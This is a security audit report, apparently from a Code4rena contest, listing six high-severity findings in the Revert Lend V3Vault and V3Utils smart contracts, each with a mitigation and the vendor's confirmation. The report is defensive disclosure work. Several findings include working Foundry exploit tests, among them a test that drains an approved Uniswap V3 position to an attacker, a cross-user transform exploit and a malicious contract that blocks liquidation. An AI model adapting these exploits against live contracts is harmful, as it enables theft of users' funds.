@@ -1,0 +1,171 @@
+[H-01]V3Vault.solpermit signature does not check receiving token address is USDC
+Submitted byVAD37, also found by thank_you (1,2,3),santiellena,ArsenLupin,jesusrod15, andayden
+InV3Vault.solthere all 3 instances ofpermit2.permitTransferFrom(), all 3 does not check token transfered in is USDC token.
+Allowing user to craft permit signature from any ERC20 token and Vault will accept it as USDC.
+Impact
+User can steal all USDC from vault using permit signature of any ERC20 token.
+Proof of Concept
+Here is how Vault accept USDC from user. Vault will acceptUniswap.Permit2signature transfer allowance from Permit2 then to vault contract.
+https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L877C1-L917C6
+if(params.permitData.length>0) {(ISignatureTransfer.PermitTransferFrommemorypermit,bytesmemorysignature) =abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom,bytes));permit2.permitTransferFrom(permit,ISignatureTransfer.SignatureTransferDetails(address(this),state.liquidatorCost),msg.sender,signature);}else{// take value from liquidatorSafeERC20.safeTransferFrom(IERC20(asset),msg.sender,address(this),state.liquidatorCost);}
+Below is permit signature struct that can be decoded from user provided data:
+interfaceISignatureTransferisIEIP712{/// @notice The token and amount details for a transfer signed in the permit transfer signaturestructTokenPermissions{// ERC20 token addressaddresstoken;// the maximum amount that can be spentuint256amount;}/// @notice The signed permit message for a single token transferstructPermitTransferFrom{TokenPermissionspermitted;// a unique value for every token owner's signature to prevent signature replaysuint256nonce;// deadline on the permit signatureuint256deadline;}}
+V3Vault.solneeds to checkTokenPermissions.tokenis USDC, same as vault main asset.
+Uniswap.permit2.permitTransferFrom()only checks if the sign signature is correct. This is meaningless as Vault does not validate input data.
+This allows users to use any ERC20 token, gives allowance and permits toUniswap.Permit2. The Vault will accept any transfer token fromPermit2as USDC. Allowing users to deposit any ERC20 token and steal USDC from vault.
+Recommended Mitigation Steps
+Fix missing user input validations in 3 all instances ofpermit2:
+https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L717C1-L725C15https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L893C1-L898C15https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L877C1-L917C6
+if(params.permitData.length>0) {(ISignatureTransfer.PermitTransferFrommemorypermit,bytesmemorysignature) =abi.decode(params.permitData, (ISignatureTransfer.PermitTransferFrom,bytes));require(permit.permitted.token==asset,"V3Vault: invalid token");//@permitted amount is checked inside uniswap Permit2permit2.permitTransferFrom(permit,ISignatureTransfer.SignatureTransferDetails(address(this),state.liquidatorCost),msg.sender,signature);}else{// take value from liquidatorSafeERC20.safeTransferFrom(IERC20(asset),msg.sender,address(this),state.liquidatorCost);}
+Assessed type
+ERC20
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRhere- checks token in permit.
+Status:Mitigation confirmed. Full details in reports fromthank_you,b0g0andktg.
+
+[H-02] Risk of reentrancyonERC721Receivedfunction to manipulate collateral token configs shares
+Submitted byAymen0909, also found byb0g0
+https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L454-L473https://github.com/code-423n4/2024-03-revert-lend/blob/main/src/V3Vault.sol#L1223-L1241
+Issue Description
+TheonERC721Receivedfunction is invoked whenever the vault contract receives a Uniswap V3 position ERC721 token. This can happen either when an owner creates a new position or when a transformation occurs.
+For this issue, we’ll focus on the second case, specifically when a position is going through a transformation, which creates a new position token. In such a case, we havetokenId != oldTokenId, and the else block is run, as shown below:
+functiononERC721Received(address,addressfrom,uint256tokenId,bytescalldatadata)externaloverridereturns(bytes4){...if{...}else{uint256oldTokenId=transformedTokenId;// if in transform mode - and a new position is sent - current position is replaced and returnedif(tokenId!=oldTokenId) {addressowner=tokenOwner[oldTokenId];// set transformed token to new onetransformedTokenId=tokenId;// copy debt to new tokenloans[tokenId] =Loan(loans[oldTokenId].debtShares);_addTokenToOwner(owner,tokenId);emitAdd(tokenId,owner,oldTokenId);// clears data of old loan_cleanupLoan(oldTokenId,debtExchangeRateX96,lendExchangeRateX96,owner);//@audit can reenter with onERC721Received and call repay or borrow to call _updateAndCheckCollateral twice and manipulate collateral token configs// sets data of new loan_updateAndCheckCollateral(tokenId,debtExchangeRateX96,lendExchangeRateX96,0,loans[tokenId].debtShares);}}returnIERC721Receiver.onERC721Received.selector;}
+We should note that the_cleanupLoanfunction does return the old position token to the owner:
+function_cleanupLoan(uint256tokenId,uint256debtExchangeRateX96,uint256lendExchangeRateX96,addressowner)internal{_removeTokenFromOwner(owner,tokenId);_updateAndCheckCollateral(tokenId,debtExchangeRateX96,lendExchangeRateX96,loans[tokenId].debtShares,0);deleteloans[tokenId];nonfungiblePositionManager.safeTransferFrom(address(this),owner,tokenId);emitRemove(tokenId,owner);}
+The issue that can occur is that the_cleanupLoanis invoked before the_updateAndCheckCollateralcall. So, a malicious owner can use theonERC721Receivedcallback when receiving the old token to call theborrowfunction, which makes changes toloans[tokenId].debtSharesand calls_updateAndCheckCollateral. When the call resumes, theV3Vault.onERC721Receivedfunction will call_updateAndCheckCollateralagain, resulting in incorrect accounting of internal token configs debt shares (tokenConfigs[token0].totalDebtShares&tokenConfigs[token1].totalDebtShares) and potentially impacting the vault borrowing process negatively.
+Proof of Concept
+Let’s use the following scenario to demonstrate the issue:
+Before starting, we suppose the following states:
+tokenConfigs[token0].totalDebtShares = 10000tokenConfigs[token1].totalDebtShares = 15000Bob has previously deposited a UniswapV3 position (which usestoken0andtoken1) withtokenId = 12and borrowedloans[tokenId = 12].debtShares = 1000debt shares.Bob calls thetransformfunction to change the range of his position using the AutoRange transformer, which mints a new ERC721 tokentokenId = 20for the newly arranged position and sends it to the vault.Upon receiving the new token, theV3Vault.onERC721Receivedfunction is triggered. As we’re in transformation mode and the token ID is different, the second else block above will be executed.V3Vault.onERC721Receivedwill copy loan debt shares to the new token, so we’ll haveloans[tokenId = 20].debtShares = 1000.ThenV3Vault.onERC721Receivedwill invoke the_cleanupLoanfunction to clear the data of the old loan and transfer the old position tokentokenId = 12back to Bob.5.1._cleanupLoanwill also call_updateAndCheckCollateralfunction to changeoldShares = 1000 --> newShares = 0(remove old token shares), resulting in:tokenConfigs[token0].totalDebtShares = 10000 - 1000 = 9000.tokenConfigs[token1].totalDebtShares = 15000 - 1000 = 14000.Bob, upon receiving the old position token, will also use the ERC721onERC721Receivedcallback to call theborrowfunction. He will borrow 200 debt shares against his new position tokentokenId = 20.6.1. Theborrowfunction will update the token debt shares fromloans[tokenId = 20].debtShares = 1000to:loans[tokenId = 20].debtShares = 1000 + 200 = 1200(assuming the position is healthy).6.2. Theborrowfunction will also invoke the_updateAndCheckCollateralfunction to changeoldShares = 1000 --> newShares = 1200fortokenId = 20, resulting in:tokenConfigs[token0].totalDebtShares = 9000 + 200 = 9200.tokenConfigs[token1].totalDebtShares = 14000 + 200 = 14200.Bob’s borrow call ends, and theV3Vault.onERC721Receivedcall resumes._updateAndCheckCollateralgets called again, changingoldShares = 0 --> newShares = 1200(as the borrow call changed the token debt shares), resulting in:tokenConfigs[token0].totalDebtShares = 9200 + 1200 = 10400.tokenConfigs[token1].totalDebtShares = 14200 + 1200 = 15400.
+Now, let’s assess what Bob managed to achieve by taking a normal/honest transformation process (without using theonERC721Receivedcallback) and then a borrow operation scenario:
+Normally, whenV3Vault.onERC721Receivedis called, it shouldn’t change the internal token configs debt shares (tokenConfigs[token0].totalDebtShares&tokenConfigs[token1].totalDebtShares). After a normalV3Vault.onERC721Received, we should still have:tokenConfigs[token0].totalDebtShares = 10000.tokenConfigs[token1].totalDebtShares = 15000.Then, when Bob borrows 200 debt shares against the new token, we should get:tokenConfigs[token0].totalDebtShares = 10000 + 200 = 10200.tokenConfigs[token1].totalDebtShares = 15000 + 200 = 15200.
+We observe that by using theonERC721Receivedcallback, Bob managed to increase the internal token configs debt shares (tokenConfigs[token0].totalDebtShares&tokenConfigs[token1].totalDebtShares) by 200 debt shares more than expected.
+This means that Bob, by using this attack, has manipulated the internal token configs debt shares, making the vault believe it has 200 additional debt shares. Bob can repeat this attack multiple times until he approaches the limit represented bycollateralValueLimitFactorX32andcollateralValueLimitFactorX32multiplied by the amount of asset lent as shown below:
+uint256lentAssets=_convertToAssets(totalSupply(),lendExchangeRateX96,Math.Rounding.Up);uint256collateralValueLimitFactorX32=tokenConfigs[token0].collateralValueLimitFactorX32;if(collateralValueLimitFactorX32<type(uint32).max&&_convertToAssets(tokenConfigs[token0].totalDebtShares,debtExchangeRateX96,Math.Rounding.Up) >(lentAssets*collateralValueLimitFactorX32) /Q32) {revertCollateralValueLimit();}collateralValueLimitFactorX32=tokenConfigs[token1].collateralValueLimitFactorX32;if(collateralValueLimitFactorX32<type(uint32).max&&_convertToAssets(tokenConfigs[token1].totalDebtShares,debtExchangeRateX96,Math.Rounding.Up) >(lentAssets*collateralValueLimitFactorX32) /Q32) {revertCollateralValueLimit();}
+Then, when other borrowers try to call theborrowfunction, it will revert because_updateAndCheckCollateralwill trigger theCollateralValueLimiterror, thinking there is too much debt already. However, this is not the case, as the internal token configs debt shares have been manipulated (increased) by an attacker (Bob).
+This attack is irreversible because there is no way to correct the internal token configs debt shares (tokenConfigs[token0].totalDebtShares&tokenConfigs[token1].totalDebtShares), and the vault will remain in that state, not allowing users to borrow, resulting in no interest being accrued and leading to financial losses for the lenders and the protocol.
+Impact
+A malicious attacker could use the AutoRange transformation process to manipulate the internal token configs debt shares, potentially resulting in:
+Fewer loans being allowed by the vault than expected.A complete denial-of-service (DOS) for all borrow operations.
+Tools Used
+VS Code
+Recommended Mitigation
+The simplest way to address this issue is to ensure that theonERC721Receivedfunction follows the Correctness by Construction (CEI) pattern, as follows:
+function onERC721Received(address, address from, uint256 tokenId, bytes calldata data)externaloverridereturns (bytes4){...if {...} else {uint256 oldTokenId = transformedTokenId;// if in transform mode - and a new position is sent - current position is replaced and returnedif (tokenId != oldTokenId) {address owner = tokenOwner[oldTokenId];// set transformed token to new onetransformedTokenId = tokenId;// copy debt to new tokenloans[tokenId] = Loan(loans[oldTokenId].debtShares);_addTokenToOwner(owner, tokenId);emit Add(tokenId, owner, oldTokenId);--          // clears data of old loan--          _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);// sets data of new loan_updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, 0, loans[tokenId].debtShares);++          // clears data of old loan++          _cleanupLoan(oldTokenId, debtExchangeRateX96, lendExchangeRateX96, owner);}}return IERC721Receiver.onERC721Received.selector;}
+Assessed type
+Context
+kalinbas (Revert) confirmed via duplicate Issue #309:
+Revert mitigated:
+PRshereandhere- removed sending of NFT to avoid reentrancy.
+Status:Mitigation confirmed. Full details in reports fromthank_you,ktgandb0g0.
+
+[H-03]V3Vault::transformdoes not validate thedatainput and allows a depositor to exploit any position approved on the transformer
+Submitted byb0g0
+Any account holding a position insideV3Vaultcan transform any NFT position outside the vault that has been delegated to Revert operators for transformation (AutoRange,AutoCompoundand all other transformers that manage positions outside of the vault).
+The exploiter can pass anyparamsat any time, affecting positions they do not own and their funds critically.
+Vulnerability details
+In order to borrow fromV3Vault, an account must first create a collateralized position by sending his position NFT through thecreate()function
+Any account that has a position inside the vault can use thetransform()function to manage the NFT, while it is owned by the vault:
+https://github.com/code-423n4/2024-03-revert-lend/blob/435b054f9ad2404173f36f0f74a5096c894b12b7/src/V3Vault.sol#L497
+function transform(uint256 tokenId, address transformer, bytes calldata data)externaloverridereturns (uint256 newTokenId){....//@audit -> tokenId inside data not checked(uint256 newDebtExchangeRateX96,) = _updateGlobalInterest();address loanOwner = tokenOwner[tokenId];// only the owner of the loan, the vault itself or any approved caller can call thisif (loanOwner != msg.sender && !transformApprovals[loanOwner][tokenId][msg.sender]) {revert Unauthorized();}// give access to transformernonfungiblePositionManager.approve(transformer, tokenId);(bool success,) = transformer.call(data);if (!success) {revert TransformFailed();}....// check owner not changed (NEEDED because token could have been moved somewhere else in the meantime)address owner = nonfungiblePositionManager.ownerOf(tokenId);if (owner != address(this)) {revert Unauthorized();}....return tokenId;}
+The user passes an approved transformer address and the calldata to execute on it. The problem here is that the function only validates the ownership of theuint256 tokenIdinput parameter. However, it never checks if thetokenIdencoded insidebytes calldata dataparameter belongs tomsg.sender.
+This allows any vault position holder tocall an allowed transformer with arbitrary params encoded as calldata and change any position delegated to that transformer.
+This will impact all current and future transformers that manage Vault positions. To prove the exploit, I’m providing a coded POC using theAutoCompoundtransformer.
+Proof of Concept
+A short explanation of the POC:
+Aliceis an account outside the vault that approves her positionALICE_NFTto be auto-compounded by Revert controlled operators (bots).Bobdecides to act maliciously and transformAliceposition.Bobopens a position in the vault with hisBOB_NFTso that he can calltransform().BobcallsV3Vault.transform()withBOB_NFTastokenIdparam to pass validation but encodesALICE_NFTinside data.Bobsuccessfully transformsAliceposition with his params.
+You can add the following test toV3Vault.t.soland runforge test --contracts /test/V3Vault.t.sol --mt testTransformExploit -vvvv.
+functiontestTransformExploit()external{// AliceaddressALICE_ACCOUNT=TEST_NFT_ACCOUNT;uint256ALICE_NFT=TEST_NFT;// Malicious useraddressEXPLOITER_ACCOUNT=TEST_NFT_ACCOUNT_2;uint256EXPLOITER_NFT=TEST_NFT_2;// Set up an auto-compound transformerAutoCompoundautoCompound=newAutoCompound(NPM,WHALE_ACCOUNT,WHALE_ACCOUNT,60,100);vault.setTransformer(address(autoCompound),true);autoCompound.setVault(address(vault),true);// Set fee to 2%uint256Q64=2**64;autoCompound.setReward(uint64(Q64/50));// Alice decides to delegate her position to// Revert bots (outside of vault) to be auto-compoundedvm.prank(ALICE_ACCOUNT);NPM.approve(address(autoCompound),ALICE_NFT);// Exploiter opens a position in the Vaultvm.startPrank(EXPLOITER_ACCOUNT);NPM.approve(address(vault),EXPLOITER_NFT);vault.create(EXPLOITER_NFT,EXPLOITER_ACCOUNT);vm.stopPrank();// Exploiter passes ALICE_NFT as paramAutoCompound.ExecuteParamsmemoryparams=AutoCompound.ExecuteParams(ALICE_NFT,false,0);// Exploiter account uses his own token to pass validation// but transforms Alice positionvm.prank(EXPLOITER_ACCOUNT);vault.transform(EXPLOITER_NFT,address(autoCompound),abi.encodeWithSelector(AutoCompound.execute.selector,params));}
+Since the exploiter can control the calldata send to the transformer, he can impact any approved position in various ways. In the case ofAutoCompoundit can be:
+Draining the position funds -AutoCompoundcollects a fee on every transformation. The exploiter can call it multiple times.Manipulatingswap0To1&amountInparameters to execute swaps in unfavourable market conditions, leading to loss of funds or value extraction.
+Those are only a couple of ideas. The impact can be quite severe depending on the transformer and parameters passed.
+Tools Used
+Foundry
+Recommended Mitigation Steps
+Consider adding a check insidetransform()to make sure the providedtokenIdand the one encoded as calldata are the same. This way the caller will not be able to manipulate other accounts positions.
+Assessed type
+Invalid Validation
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRhere- refactoring to make all transformers properly check caller permission.
+Status:Mitigation confirmed. Full details in reports fromktg,thank_youandb0g0.
+
+[H-04]V3Utils.execute()does not have caller validation, leading to stolen NFT positions from users
+Submitted by0xjuan, also found byCaeraDenoir,santiellena,Tigerfrake,Timenov, andnovamanbg
+When a user wants to useV3Utils, one of the flows stated by the protocol is as follows:
+TX1: User callsNPM.approve(V3Utils, tokenId).TX2: User callsV3Utils.execute()with specific instructions.
+Note that this can’t be done in one transaction since in TX1, the NPM has to be called directly by the EOA which owns the NFT. Thus, theV3Utils.execute()would have to be called in a subsequent transaction.
+Now this is usually a safe design pattern, but the issue is thatV3Utils.execute()does not validate the owner of the UniV3 Position NFT that is being handled. This allows anybody to provide arbitrary instructions and callV3Utils.execute()once the NFT has been approved in TX1.
+A malicious actor provide instructions that include the following:
+WhatToDo = WITHDRAW_AND_COLLECT_AND_SWAP.recipient = malicious_actor_address.liquidity = total_position_liquidity.
+This would collect all liquidity from the position that was approved, and send it to the malicious attacker who didn’t own the position.
+Impact
+The entire liquidity of a specific UniswapV3 liquidity provision NFT can be stolen by a malicious actor, with zero cost.
+Proof of Concept
+This foundry test demonstrates how an attacker can steal all the liquidity from a UniswapV3 position NFT that is approved to the V3Utils contract.
+To run the PoC:
+Add the following foundry test totest/integration/V3Utils.t.sol.Run the commandforge test --via-ir --mt test_backRunApprovals_toStealAllFunds -vvin the terminal.
+functiontest_backRunApprovals_toStealAllFunds()external{addressattacker=makeAddr("attacker");uint256daiBefore=DAI.balanceOf(attacker);uint256usdcBefore=USDC.balanceOf(attacker);(,,,,,,,uint128liquidityBefore,,,,) =NPM.positions(TEST_NFT_3);console.log("Attacker's DAI Balance Before: %e",daiBefore);console.log("Attacker's USDC Balance Before: %e",usdcBefore);console.log("Position #%s's liquidity Before: %e",TEST_NFT_3,liquidityBefore);// Malicious instructions used by attacker:V3Utils.Instructionsmemorybad_inst=V3Utils.Instructions(V3Utils.WhatToDo.WITHDRAW_AND_COLLECT_AND_SWAP,address(USDC),0,0,0,0,"",0,0,"",type(uint128).max,type(uint128).max,0,0,0,liquidityBefore,// Attacker chooses to withdraw 100% of the position's liquidity0,0,block.timestamp,attacker,// Recipient address of tokensaddress(0),false,"","");// User approves V3Utils, planning to execute nextvm.prank(TEST_NFT_3_ACCOUNT);NPM.approve(address(v3utils),TEST_NFT_3);console.log("\n--ATTACK OCCURS--\n");// User's approval gets back-ranvm.prank(attacker);v3utils.execute(TEST_NFT_3,bad_inst);uint256daiAfter=DAI.balanceOf(attacker);uint256usdcAfter=USDC.balanceOf(attacker);(,,,,,,,uint128liquidityAfter,,,,) =NPM.positions(TEST_NFT_3);console.log("Attacker's DAI Balance After: %e",daiAfter);console.log("Attacker's USDC Balance After: %e",usdcAfter);console.log("Position #%s's liquidity After: %e",TEST_NFT_3,liquidityAfter);}
+Console output:
+Ran 1 test for test/integration/V3Utils.t.sol:V3UtilsIntegrationTest[PASS] test_backRunApprovals_toStealAllFunds() (gas: 351245)Logs:Attacker's DAI Balance Before: 0e0Attacker's USDC Balance Before: 0e0Position #4660's liquidity Before: 1.2922419498089422291e19--ATTACK OCCURS--Attacker's DAI Balance After: 4.2205702812280886591005e22Attacker's USDC Balance After: 3.5931648355e10Position #4660's liquidity After: 0e0Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.17sRan 1 test suite in 1.17s: 1 tests passed, 0 failed, 0 skipped (1 total tests)
+Recommended Mitigation Steps
+Add a check to ensure that only the owner of the position can callV3Utils.execute.
+Note the fix also checks for the case where a user may have transferred the token into theV3Utils. In that case it is fine thatmsg.sender != tokenOwner, sincetokenOwnerwould then be the V3Utils contract itself.
+function execute(uint256 tokenId, Instructions memory instructions) public returns (uint256 newTokenId) {+       address tokenOwner = nonfungiblePositionManager.ownerOf(tokenId);+       if (tokenOwner != msg.sender && tokenOwner != address(this)) {+           revert Unauthorized();+       }/* REST OF CODE */}
+Assessed type
+Access Control
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRhere- refactoring to make all transformers properly check caller permission.
+Status:Mitigation confirmed. Full details in reports fromthank_you,ktgandb0g0.
+
+[H-05]_getReferencePoolPriceX96()will show incorrect price for negative tick deltas in current implementation cause it doesn’t round up for them
+Submitted byBauchibred, also found by grearlake (1,2),Giorgio, andkodyvim
+Take a lookhere.
+function_getReferencePoolPriceX96(IUniswapV3Poolpool,uint32twapSeconds)internalviewreturns(uint256) {uint160sqrtPriceX96;// if twap seconds set to 0 just use pool priceif(twapSeconds==0) {(sqrtPriceX96,,,,,,) =pool.slot0();}else{uint32[]memorysecondsAgos=newuint32[](2);secondsAgos[0] =0;// from (before)secondsAgos[1] =twapSeconds;// from (before)(int56[]memorytickCumulatives,) =pool.observe(secondsAgos);// pool observe may fail when there is not enough history available (only use pool with enough history!)//@auditint24tick=int24((tickCumulatives[0] -tickCumulatives[1]) /int56(uint56(twapSeconds)));sqrtPriceX96=TickMath.getSqrtRatioAtTick(tick);}returnFullMath.mulDiv(sqrtPriceX96,sqrtPriceX96,Q96);}
+This function is used to calculate the reference pool price. It uses either the latest slot price or TWAP based on twapSeconds.
+Now note thatunlike the original uniswap implementation, here the delta of the tick cumulative is being calculated in a different manner, i.eprotocol implements (tickCumulatives[0] -tickCumulatives[1]instead oftickCumulatives[1] - (tickCumulatives[0]which is because here,secondsAgos[0] = 0;andsecondsAgos[1] = twapSeconds;; unlikein Uniswap OracleLibrarywheresecondsAgos[0] = secondsAgo;andsecondsAgos[1] = 0;, so everything checks out and the tick deltas are calculated accurately, i.e in our casetickCumulativesDelta = tickCumulatives[0] - tickCumulatives[1].
+The problem now is that in the case if ourtickCumulativesDeltais negative, i.eint24(tickCumulatives[0] - tickCumulatives[1] < 0), then the tick should be rounded down, as it’s done in theuniswap library.
+But this is not being done and as a result, in the case ifint24(tickCumulatives[0] - tickCumulatives[1])is negative and(tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0, then the returned tick will be bigger then it should be; which opens possibility for some price manipulations and arbitrage opportunities.
+Impact
+In this case, ifint24(tickCumulatives[0] - tickCumulatives[1])is negative and((tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0, then returned tick will be bigger than it should be which places protocol wanting prices to be right not be able to achieve this goal. Note that whereas protocol in some cases relies on multiple sources of price, they still come down and end on weighing the differences between the prices and reverting if a certain limit is passed (MIN_PRICE_DIFFERENCE) between both the Chainlink price and Uniswap twap price.Now in the case where the implementedpricing mode is onlyTWAP, then the protocol would work with a flawed price since the returned price would be different than it really is; potentially leading to say, for example, some positions that should be liquidatable not being liquidated. Before liquidation, there isa check to see if the loan is healthy. Now this checkqueries the value of this asset via getValue()and if returned price is wrong then unhealthy loans could be pronounced as healthy and vice versa.Also, this indirectly curbs the access to functions likeborrow(),transform()anddecreaseLiquidityAndCollect(), since they all make a call to_requireLoanIsHealthy(), which would be unavailable due to it’s dependence on_checkLoanIsHealthy().This bug case causes the Automator’s_getTWAPTick()function to also return a wrong tick, which then leads to_hasMaxTWAPTickDifference()returning false data, since the difference would now be bigger eventually leading towronglydisabling/enabling of swaps inAutoCompound.sol, whereas, it should be otherwise.
+Note that for the second/third case, the call route to get to_getReferencePoolPriceX96()is:"_checkLoanIsHealthy() -> getValue() -> _getReferenceTokenPriceX96 -> _getTWAPPriceX96 -> _getReferencePoolPriceX96() "as can be seenhere.
+Tools Used
+Uniswap V3’s OracleLibrary.And a similar finding onCode4renafrom Q1 2024.
+Recommended Mitigation Steps
+Add this line:if (tickCumulatives[0] - tickCumulatives[1] < 0 && (tickCumulatives[0] - tickCumulatives[1]) % secondsAgo != 0) timeWeightedTick --;.
+Assessed type
+Uniswap
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRhere- fixed calculation.
+Status:Mitigation confirmed. Full details in reports fromthank_you,b0g0andktg.
+
+[H-06] Owner of a position can prevent liquidation due to theonERC721Receivedcallback
+Submitted by0xjuan, also found byCaeraDenoir,kinda_very_good,falconhoof,0x175,Arz,JohnSmith,alix40,stackachu,givn,wangxx2026,Ocean_Sky,0xloscar01,SpicyMeatball,0xAlix2,Ali-_-Y,0rpse,iamandreiski,0xBugSlayer,nmirchev8,nnez,ayden, andnovamanbg
+When liquidating a position,_cleanUpLoan()is called on the loan. This attempts to send the uniswap LP position back to the user via the following line:
+nonfungiblePositionManager.safeTransferFrom(address(this),owner,tokenId);
+ThissafeTransferFromfunction call invokes theonERC721Receivedfunction on the owner’s contract. The transaction will only succeed if the owner’s contract returns the function selector of the standardonERC721Receivedfunction. However, the owner can design the function to return an invalid value, and this would lead to thesafeTransferFromreverting, thus being unable to liquidate the user.
+Impact
+This leads to bad debt accrual in the protocol which cannot be prevented, and eventually insolvency.
+Proof of Concept
+Below is a foundry test that proves this vulnerability. To run the PoC:
+Copy the attacker contract intotest/integration/V3Vault.t.sol.In the same file, copy the contents of the ‘foundry test’ dropdown into theV3VaultIntegrationTestcontract.In the terminal, enterforge test --via-ir --mt test_preventLiquidation -vv.
+Attacker Contract:
+contractMaliciousBorrower{addresspublicvault;constructor(address_vault) {vault=_vault;}functiononERC721Received(addressoperator,addressfrom,uint256tokenId,bytescalldatadata)externalreturns(bytes4) {// Does not accept ERC721 tokens from the vault. This causes liquidation to revertif(from==vault)returnbytes4(0xdeadbeef);elsereturnmsg.sig;}}
+Foundry test:
+functiontest_preventLiquidation()external{// Create malicious borrower, and setup a loanaddressmaliciousBorrower=address(newMaliciousBorrower(address(vault)));custom_setupBasicLoan(true,maliciousBorrower);// assert: debt is equal to collateral value, so position is not liquidatable(uint256debt,,uint256collateralValue,uint256liquidationCost,uint256liquidationValue) =vault.loanInfo(TEST_NFT);assertEq(debt,collateralValue);// collateral DAI value change -100%vm.mockCall(CHAINLINK_DAI_USD,abi.encodeWithSelector(AggregatorV3Interface.latestRoundData.selector),abi.encode(uint80(0),int256(0),block.timestamp,block.timestamp,uint80(0)));// ignore differenceoracle.setMaxPoolPriceDifference(10001);// assert that debt is greater than collateral value (position is liquidatable now)(debt, ,collateralValue,liquidationCost,liquidationValue) =vault.loanInfo(TEST_NFT);assertGt(debt,collateralValue);(uint256debtShares) =vault.loans(TEST_NFT);vm.startPrank(WHALE_ACCOUNT);USDC.approve(address(vault),liquidationCost);// This fails due to malicious owner. So under-collateralised position can't be liquidated. DoS!vm.expectRevert("ERC721: transfer to non ERC721Receiver implementer");vault.liquidate(IVault.LiquidateParams(TEST_NFT,debtShares,0,0,WHALE_ACCOUNT,""));}functioncustom_setupBasicLoan(boolborrowMax,addressborrower)internal{// lend 10 USDC_deposit(10000000,WHALE_ACCOUNT);// Send the test NFT to borrower accountvm.prank(TEST_NFT_ACCOUNT);NPM.transferFrom(TEST_NFT_ACCOUNT,borrower,TEST_NFT);uint256tokenId=TEST_NFT;// borrower adds collateralvm.startPrank(borrower);NPM.approve(address(vault),tokenId);vault.create(tokenId,borrower);(,,uint256collateralValue,,) =vault.loanInfo(tokenId);// borrower borrows assets, backed by their univ3 positionif(borrowMax) {// borrow maxvault.borrow(tokenId,collateralValue);}vm.stopPrank();}
+Terminal output:
+Ran 1 test for test/integration/V3Vault.t.sol:V3VaultIntegrationTest[PASS] test_preventLiquidation() (gas: 1765928)Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 473.56ms
+Recommended Mitigation Steps
+One solution would be to approve the NFT to the owner and provide a way (via the front-end or another contract) for them to redeem the NFT back later on. This is a “pull over push” approach and ensures that the liquidation will occur.
+Example:
+function _cleanupLoan(uint256 tokenId, uint256 debtExchangeRateX96, uint256 lendExchangeRateX96, address owner)internal{_removeTokenFromOwner(owner, tokenId);_updateAndCheckCollateral(tokenId, debtExchangeRateX96, lendExchangeRateX96, loans[tokenId].debtShares, 0);delete loans[tokenId];-        nonfungiblePositionManager.safeTransferFrom(address(this), owner, tokenId);+       nonfungiblePositionManager.approve(owner, tokenId);emit Remove(tokenId, owner);}
+Assessed type
+DoS
+kalinbas (Revert) confirmed
+Revert mitigated:
+PRshereandhere- removed sending of NFT to avoid reentrancy.
+Status:Mitigation confirmed. Full details in reports fromthank_you,ktgandb0g0.
+
